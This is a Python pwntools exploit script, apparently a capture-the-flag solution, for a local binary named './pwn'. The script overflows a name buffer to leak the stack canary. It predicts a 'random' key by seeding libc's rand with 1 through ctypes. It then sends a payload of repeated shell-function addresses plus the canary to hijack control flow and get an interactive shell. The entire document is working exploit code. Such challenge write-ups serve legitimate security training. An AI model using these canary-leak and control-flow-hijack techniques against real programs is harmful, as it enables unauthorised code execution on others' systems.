#coding=utf-8
from pwn import*
from ctypes import* #调用C语言动态链接库
context(os='linux',arch='amd64')
context.log_level = 'debug'
# gdb.attach(p)
# pause()

def pr(a,addr):
	log.success(a+': '+hex(addr))

p = process('./pwn')
libc = cdll.LoadLibrary("libc.so.6") # Load standard C library on Linux
shell = 0x4007Cb

p.recvuntil(b'tell me you name\n\n')
payload = b'a'*0x28
p.sendline(payload)
p.recvuntil(b'hello,')
p.recv(0x29)
canary = u64(p.recv(8)) - 0xa
pr("canary",canary)

libc.srand(1) #libc.srand(1)伪随机 其实是个数列
p.recvuntil(b'tell me key\n')
key = libc.rand() % 1000 + 324
print(key)
p.send(p32(key))
p.recvuntil(b'can make a wish to me\n')

payload = p64(shell)*0xb + p64(canary)
# gdb.attach(p)
# pause()

p.send(payload)
p.interactive()
